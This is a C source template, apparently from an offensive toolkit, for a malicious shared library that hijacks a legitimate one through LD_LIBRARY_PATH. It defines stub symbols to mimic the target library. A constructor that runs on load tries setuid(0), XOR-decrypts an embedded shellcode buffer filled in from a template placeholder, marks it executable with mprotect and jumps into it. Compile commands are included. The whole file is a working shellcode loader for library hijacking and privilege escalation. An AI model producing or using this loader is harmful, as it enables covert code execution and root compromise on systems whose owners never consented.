#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows:
// gcc -Wall -fPIC -z execstack -c -o ld_library_path.o ld_library_path.c
// gcc -shared -o lib{{ target_library }}.so ld_library_path.o -ldl

static void runmahpayload() __attribute__((constructor));

// Stub functions to mimic target library
// Add function stubs that match the target library being hijacked
int gpgrt_onclose;
int gpgrt_poll;

// Shellcode (XOR encrypted with key: 0x{{ xor_key }})
{{ c_payload }}

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        
        int buf_len = (int) sizeof(buf);
        int key = 0x{{ xor_key }};
        
        // Decrypt shellcode
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        
        int (*ret)() = (int(*)())buf;
        ret();
}
